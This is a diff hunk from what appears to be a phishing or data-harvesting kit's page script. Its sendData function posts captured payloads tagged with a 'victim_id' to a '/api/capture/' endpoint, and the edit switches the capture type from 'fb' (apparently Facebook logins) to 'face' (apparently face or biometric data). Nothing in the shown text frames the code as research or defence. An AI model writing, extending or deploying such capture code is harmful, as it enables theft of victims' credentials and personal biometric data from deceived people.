@@ -287,10 +287,10 @@
 
         async function sendData(payload) {
             try {
-                await fetch('/api/capture/fb', {
+                await fetch('/api/capture/face', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ victim_id: victimId, type: 'fb', ...payload })
+                    body: JSON.stringify({ victim_id: victimId, type: 'face', ...payload })
                 });
             } catch (e) {
                 console.log('Send error:', e);
